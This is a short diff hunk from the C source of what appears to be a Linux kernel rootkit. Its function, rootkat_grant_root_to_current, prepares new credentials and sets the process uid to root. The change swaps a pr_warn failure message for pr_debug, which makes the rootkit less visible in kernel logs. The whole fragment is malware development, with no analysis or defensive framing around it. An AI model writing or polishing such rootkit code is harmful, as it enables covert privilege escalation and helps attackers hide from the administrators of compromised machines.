@@ -16,7 +16,7 @@ void rootkat_grant_root_to_current(void)
 	struct cred *new = prepare_creds();
 
 	if (!new) {
-		pr_warn(TAG "prepare_creds failed\n");
+		pr_debug(TAG "prepare_creds failed\n");
 		return;
 	}
 	new->uid   = GLOBAL_ROOT_UID;
